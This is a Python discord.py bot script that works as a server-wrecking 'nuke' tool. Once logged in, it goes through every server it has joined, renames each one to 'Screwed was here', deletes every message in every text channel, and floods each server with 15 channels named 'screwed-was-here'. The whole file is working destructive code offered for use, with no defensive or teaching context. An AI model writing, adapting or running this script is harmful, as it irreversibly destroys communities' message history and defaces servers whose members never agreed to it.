import discord
from discord.ext import commands

# Replace with your bot token
TOKEN = '1234567890'

# Intents: To manage messages, server settings, and channels
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

# Create a bot instance
bot = commands.Bot(command_prefix="!", intents=intents)

# Event triggered when the bot is ready
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Loop through all guilds (servers) the bot is in
    for guild in bot.guilds:
        # Change server name to "Whatervermessage"
        try:
            await guild.edit(name="Screwed was here")
            print(f"Changed server name to 'Screwed was here' in {guild.name}")
        except Exception as e:
            print(f"Failed to change name for {guild.name}: {e}")

        # Loop through all channels in the server and delete messages
        for channel in guild.text_channels:
            try:
                # Fetch and delete messages
                async for message in channel.history(limit=None):
                    await message.delete()
                print(f"Deleted all messages in {channel.name}")
            except Exception as e:
                print(f"Failed to delete messages in {channel.name}: {e}")

        # Create 15 new channels named "screwed-was-here"
        for i in range(15):
            try:
                channel_name = f'screwed-was-here-{i + 1}'
                await guild.create_text_channel(channel_name)
                print(f"Created new channel '{channel_name}' in {guild.name}")
            except Exception as e:
                print(f"Failed to create channel {i + 1} in {guild.name}: {e}")

# Run the bot
bot.run(TOKEN)
